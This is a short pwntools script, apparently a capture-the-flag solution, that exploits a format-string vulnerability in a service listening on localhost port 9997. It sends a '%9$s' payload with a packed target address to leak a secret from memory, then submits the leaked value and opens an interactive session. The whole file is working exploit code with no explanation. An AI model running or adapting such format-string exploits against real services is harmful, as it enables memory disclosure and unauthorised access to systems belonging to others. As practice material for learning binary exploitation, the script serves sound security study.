
from pwn import *

context.log_level='debug'
# p=process("./ef")
p=remote('localhost',9997)
secret_addr=0x4040B0

payload=b"%9$saaaa"+p64(secret_addr)
p.recvuntil("address:")
p.sendline(payload)
res=p.recvuntil('aaaa')
secret=u64(res[1:9])
log.info(hex(secret))
log.info(str(secret))
p.sendline(str(secret))
p.interactive()